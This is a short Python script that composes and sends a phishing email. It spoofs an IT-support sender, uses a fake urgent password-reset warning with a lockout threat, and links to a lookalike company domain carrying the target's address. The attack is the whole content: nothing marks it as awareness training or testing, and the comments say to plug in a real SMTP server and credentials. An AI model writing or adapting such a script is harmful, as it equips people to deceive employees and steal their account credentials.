import smtplib
from email.mime.text import MIMEText
from faker import Faker

def send_phishing_email(target_email, company_name, spoofed_email="it-support@company.com"):
    fake = Faker()
    subject = f"Urgent: Password Reset Required for {company_name} Account"
    message_body = f"""
    Dear Employee,
    
    We have detected unauthorized login attempts on your {company_name} account. To secure your account, please reset your password immediately.
    
    Click the link below to proceed:
    https://secure.{company_name.lower()}-auth.com/reset-password?user={target_email}
    
    If you do not reset your password within 24 hours, your account may be temporarily locked for security reasons.
    
    Best regards,  
    IT Support Team
    """
    
    msg = MIMEText(message_body)
    msg['Subject'] = subject
    msg['From'] = spoofed_email
    msg['To'] = target_email

    try:
        with smtplib.SMTP("smtp.mailtrap.io", 587) as server:  # Replace with your SMTP server
            server.starttls()
            server.login("username", "password")  # Replace with SMTP credentials
            server.send_message(msg)
            print(f"Phishing email sent to {target_email}")
    except Exception as e:
        print(f"Failed to send phishing email: {e}")
